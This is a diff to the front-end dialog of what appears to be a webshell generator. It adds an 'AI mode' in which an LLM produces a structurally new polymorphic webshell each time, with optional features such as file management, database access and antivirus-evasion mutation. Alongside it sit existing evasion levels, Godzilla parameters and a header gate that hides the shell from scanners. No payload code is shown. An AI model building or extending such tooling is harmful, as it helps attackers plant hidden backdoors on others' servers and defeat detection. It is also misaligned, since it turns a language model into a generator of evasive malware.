@@ -199,6 +199,8 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
   const [gateHeader, setGateHeader] = React.useState("");
   const [gateValue, setGateValue] = React.useState("");
   const [evasiveLevel, setEvasiveLevel] = React.useState(0);
+  const [aiMode, setAiMode] = React.useState(false);
+  const [features, setFeatures] = React.useState("");
   const [check, setCheck] = React.useState<{ checked: number; leaked: { name: string }[]; passed: boolean } | null>(null);
   const [gen, setGen] = React.useState<{ path: string; code: string; size: number } | null>(null);
   const [busy, setBusy] = React.useState(false);
@@ -208,12 +210,14 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
     if (!pwd.trim()) return void window.alert("密码必填");
     setBusy(true);
     try {
-      const r = await api.wsGenerate({
-        script_type: st, encoder: enc, password: pwd,
-        gate_header: gateHeader, gate_value: gateValue,
-        evasive: evasiveLevel > 0, evasive_level: evasiveLevel,
-      });
-      setCheck(r.data?.self_check || null);
+      const r = aiMode
+        ? await api.wsGenerateAI({ script_type: st, password: pwd, features })
+        : await api.wsGenerate({
+            script_type: st, encoder: enc, password: pwd,
+            gate_header: gateHeader, gate_value: gateValue,
+            evasive: evasiveLevel > 0, evasive_level: evasiveLevel,
+          });
+      setCheck((r.data?.self_check as { checked: number; leaked: { name: string }[]; passed: boolean } | undefined) || null);
       setGen(r.data);
     } catch (e) {
       window.alert("生成失败: " + (e instanceof Error ? e.message : String(e)));
@@ -237,6 +241,13 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
             </select>
             <Input placeholder="连接密码" value={pwd} onChange={(e) => setPwd(e.target.value)} />
           </div>
+          <label className="flex items-center gap-2 text-xs text-muted-foreground">
+            <input type="checkbox" checked={aiMode} onChange={(e) => setAiMode(e.target.checked)} />
+            AI 生成（LLM 每次产出结构全新的多态 webshell；Godzilla 参数仅 T0 生成器生效）
+          </label>
+          {aiMode && (
+            <Input placeholder="附加功能（可选，如：文件管理、数据库连接、免杀变形）" value={features} onChange={(e) => setFeatures(e.target.value)} />
+          )}
           <div className="grid grid-cols-2 gap-2">
             <Input placeholder="Header Gate 头名（可选）" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} />
             <Input placeholder="Gate 值（缺头 404）" value={gateValue} onChange={(e) => setGateValue(e.target.value)} />
@@ -253,7 +264,7 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
           <div className="text-[11px] text-muted-foreground">
             Header Gate：缺校验头直接 404，对抗扫描器。连接目标时把同名头写进「附加头 JSON」。
           </div>
-          <Button size="sm" onClick={run} disabled={busy}><PlayIcon className="mr-1 size-4" /> {busy ? "生成中…" : "生成"}</Button>
+          <Button size="sm" onClick={run} disabled={busy}><PlayIcon className="mr-1 size-4" /> {busy ? (aiMode ? "AI 生成中（约 30-60 秒）…" : "生成中…") : "生成"}</Button>
           {gen && (
             <div className="space-y-1">
               <div className="flex items-center justify-between text-xs text-muted-foreground">
